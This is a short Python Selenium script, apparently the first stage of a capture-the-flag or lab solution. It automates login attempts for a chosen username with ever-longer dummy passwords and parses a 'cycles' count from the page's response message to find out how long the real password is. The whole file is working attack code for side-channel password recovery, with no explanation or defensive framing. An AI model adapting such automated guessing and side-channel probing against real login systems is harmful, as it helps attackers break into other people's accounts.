from selenium.webdriver.common.by import By
import time


def get_password_length(driver, username: str, max_tries: int, delay: float) -> int:
    password_guess = ""
    password_length = 0

    for i in range(1, max_tries):
        print("Testing length: " + str(i))
        password_guess += "a"

        driver.find_element(By.NAME, "username").clear()
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").clear()
        driver.find_element(By.NAME, "password").send_keys(password_guess)

        print("Trying password: " + password_guess)
        driver.find_element(By.CLASS_NAME, "btn-primary").click()
        time.sleep(delay)

        response_message_element = driver.find_element(By.ID, "responseMessage")
        response_message_text = response_message_element.text

        start = response_message_text.find("used ") + 5
        end = response_message_text.find(" cycles")
        cycles = response_message_text[start:end]
        print("Used " + cycles + " cycles.")

        print("\n")

        if cycles != "0":
            print("Password length found!")
            password_length = i
            break

    return password_length
